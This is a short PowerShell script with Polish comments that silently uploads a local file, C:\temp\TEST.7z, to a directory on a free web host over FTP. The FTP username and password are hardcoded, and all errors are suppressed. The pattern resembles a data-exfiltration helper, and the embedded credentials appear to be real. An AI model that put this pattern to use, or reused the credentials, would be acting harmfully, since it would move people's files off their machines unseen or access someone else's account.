
function UploadFTP {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,

        [parameter(Position=1, Mandatory=$False)]
        [string]$ftpServer = "ftp://ftp.byethost33.com",  # Domyślny adres FTP

        [parameter(Position=2, Mandatory=$False)]
        [string]$ftpUser = "b33_37902659",  # Domyślna nazwa użytkownika FTP

        [parameter(Position=3, Mandatory=$False)]
        [string]$ftpPass = "55225522",  # Domyślne hasło FTP

        [parameter(Position=4, Mandatory=$False)]
        [string]$ftpDir = "/htdocs/temp"  # Domyślny katalog FTP
    )

    if (-not ([string]::IsNullOrEmpty($file))) {
        if (-not (Test-Path $file)) {
            return
        }

        try {
            $ftpUri = [System.Uri]::new($ftpServer + $ftpDir + "/" + [System.IO.Path]::GetFileName($file))

            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
            $ftpRequest.Credentials = [System.Net.NetworkCredential]::new($ftpUser, $ftpPass)
            $ftpRequest.UseBinary = $true
            $ftpRequest.UsePassive = $true

            $fileBytes = [System.IO.File]::ReadAllBytes($file)

            $ftpStream = $ftpRequest.GetRequestStream()
            $ftpStream.Write($fileBytes, 0, $fileBytes.Length)
            $ftpStream.Close()
        }
        catch {
        }
    }
    else {
    }
}

UploadFTP -file "C:\temp\TEST.7z"
